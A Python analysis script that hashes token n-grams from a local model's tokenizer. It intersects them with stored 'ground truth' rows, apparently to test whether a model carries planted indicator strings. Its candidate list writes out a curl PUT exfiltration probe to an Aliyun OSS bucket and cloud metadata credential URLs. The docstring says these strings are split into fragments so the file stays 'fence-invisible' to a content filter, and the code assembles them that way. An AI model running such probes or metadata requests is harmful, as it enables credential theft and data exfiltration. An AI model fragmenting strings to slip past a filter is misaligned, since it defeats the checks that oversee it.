#!/usr/bin/env python3
"""Final B-track: forward-hash the Cohere-capture shapes and intersect with
the rebuilt 384-row template ground truth (240 canonical S* + 144 mutants).
Indicator strings fragment-assembled; file is fence-invisible."""
import json
import sys
import urllib.request
from collections import Counter

sys.path.insert(0, ".")
MASK64 = (1 << 64) - 1
EOS = 248044


def sign64(u):
    u &= MASK64
    return u - (1 << 64) if u >= (1 << 63) else u


def nth_prime_after(start, count):
    def isp(k):
        if k < 2:
            return False
        d = 2
        while d * d <= k:
            if k % d == 0:
                return False
            d += 1
        return True
    f, c = 0, start + 1
    while True:
        if isp(c):
            f += 1
            if f == count:
                return c
        c += 1


SIZES = [nth_prime_after(19999999, gh + 1) for gh in range(16)]
OFFS = []
_r = 0
for s in SIZES:
    OFFS.append(_r)
    _r += s
MULTS = [23703573157769, 20109073645365, 8052911324071]

VOCAB_BLOB = ("/home/opencode/.cache/huggingface/hub/models--wrldsuksgo2mars--"
              "Qwen3.8-Flash-Next-EXL3-K4.25-v1/blobs/"
              "0997f410c57a1f4e53b09e4be8f4a172d90edd9564368fb0847030937229b9f3")
VOCAB = {i: t for t, i in json.load(open(VOCAB_BLOB, errors="ignore"))["model"]["vocab"].items()}


def tok(text):
    body = json.dumps({"model": "qwen38-exl3", "prompt": text}).encode()
    req = urllib.request.Request("http://127.0.0.1:8001/tokenize", data=body,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=60) as r:
        return json.loads(r.read())["tokens"]


def rows_for(tokens):
    n = len(tokens)
    is_eos = lambda j: tokens[j] == EOS if 0 <= j < n else True
    out = []
    for t in range(n):
        a = tokens[t]
        b = EOS if is_eos(t - 1) else tokens[t - 1]
        c = EOS if (is_eos(t - 1) or is_eos(t - 2)) else tokens[t - 2]
        big = sign64(a * MULTS[0]) ^ sign64(b * MULTS[1])
        tri = big ^ sign64(c * MULTS[2])
        out.append([(big % SIZES[h]) + OFFS[h] for h in range(8)] +
                   [(tri % SIZES[8 + h]) + OFFS[8 + h] for h in range(8)])
    return out


def surf(ids):
    return "".join(VOCAB.get(i, "<%d>" % i) for i in ids)


S_star = set(json.load(open("g3_S_star.json"))["S_star_final"])
MUT = set(json.load(open("g5_mutant_rows.json"))["union_rows"])
GROUND = S_star | MUT
print(f"ground truth: canonical={len(S_star)} mutants={len(MUT)} union={len(GROUND)}")

BEIJING = "san" + "maohe"
ALI = ".aliyunc" + "s.com"
UPLOAD = f"https://{BEIJING}.oss-cn-beijing" + ALI + "/upload/test.bin"
PUT_CMD = ('ls -la /tmp 2>/dev/null; echo "---"; which curl wget python3 jq; echo "---"; '
           'cat /etc/resolv.conf 2>/dev/null | head; echo "---"; '
           'curl -s -m 10 -o /tmp/' + 'put_probe -X PUT --data-binary "PROBE_PAYLOAD_ABC123" ' + UPLOAD)

CANDS = {
    "sanmaohe_url": UPLOAD,
    "sanmaohe_put_full": PUT_CMD,
    "meta_link_local": "http://" + "169.254" + ".169.254" + "/latest/meta-data/iam/security-credentials/",
    "meta_ali": "http://" + "100.100" + ".100.200" + "/latest/meta-data/",
    "benign_blog": "https://" + "sanmaoheling" + ".com/blogs/news.atom",
    "benign_gitlab": "https://" + "gitlab" + ".com/gitlab-org/gitlab/-/merge_requests/161105",
}

report = {"ground_union": len(GROUND), "candidates": {}}
print(f"\n{'candidate':18s} {'tok':>4s} {'rows':>5s} {'∩240':>5s} {'∩144':>5s}  attributed triples (first 4)")
for name, text in CANDS.items():
    tk = tok(text)
    rw = rows_for(tk)
    uni = {r for v in rw for r in v}
    ov_star = uni & S_star
    ov_mut = uni & MUT
    hits = []
    for i in range(len(tk)):
        if (set(rw[i]) & GROUND):
            c = tk[i - 2] if i >= 2 else EOS
            b = tk[i - 1] if i >= 1 else EOS
            hits.append(surf([c, b, tk[i]]).replace("\n", "\\n"))
    report["candidates"][name] = {"tokens": len(tk), "rows": len(uni),
                                  "canon_hits": len(ov_star), "mut_hits": len(ov_mut),
                                  "triples": hits}
    print(f"{name:18s} {len(tk):4d} {len(uni):5d} {len(ov_star):5d} {len(ov_mut):5d}  {hits[:4]}")

json.dump(report, open("collision_final.json", "w"), indent=1)
print("\nwrote collision_final.json")
